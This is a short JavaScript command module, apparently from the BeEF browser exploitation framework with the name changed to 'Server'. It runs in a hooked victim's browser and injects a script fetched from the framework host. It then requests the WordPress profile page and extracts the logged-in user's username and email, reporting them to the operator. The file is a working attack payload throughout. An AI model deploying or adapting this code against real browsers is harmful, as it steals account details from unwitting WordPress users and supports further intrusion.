/*
  Copyright (c) Browser Exploitation Framework (Server) - https://serverproject.com
  See the file 'doc/COPYING' for copying permission
  
  Author @erwan_lr (WPScanTeam) - https://wpscan.org/
*/


server.execute(function() {
  server_command_url = '<%= @command_url %>';
  server_command_id  = <%= @command_id %>;

  // Adds wp.js to the DOM so we can use some functions here
  if (typeof get_nonce !== 'function') {
    var wp_script = document.createElement('script');

    wp_script.setAttribute('type', 'text/javascript');
    wp_script.setAttribute('src', server.net.httpproto+'://'+server.net.host+':'+server.net.port+'/wp.js');
    var theparent = document.getElementsByTagName('head')[0];
    theparent.insertBefore(wp_script, theparent.firstChild);
  }

  var user_profile_path = '<%= @wp_path %>wp-admin/profile.php'

  function process_profile_page(xhr) {
    if (xhr.status == 200) {
      username = xhr.responseXML.getElementById('user_login').getAttribute('value');
      email = xhr.responseXML.getElementById('email').getAttribute('value');

      log('Username: ' + username + ', Email: ' + email, 'success');
    } else {
      log('GET ' + user_profile_path + ' - Status ' + xhr.status, 'error');
    }
  }

  // Timeout needed for the wp.js to be loaded first
  setTimeout(
    function() { get(user_profile_path, function(response) { process_profile_page(response) }) },
    300
  );

});

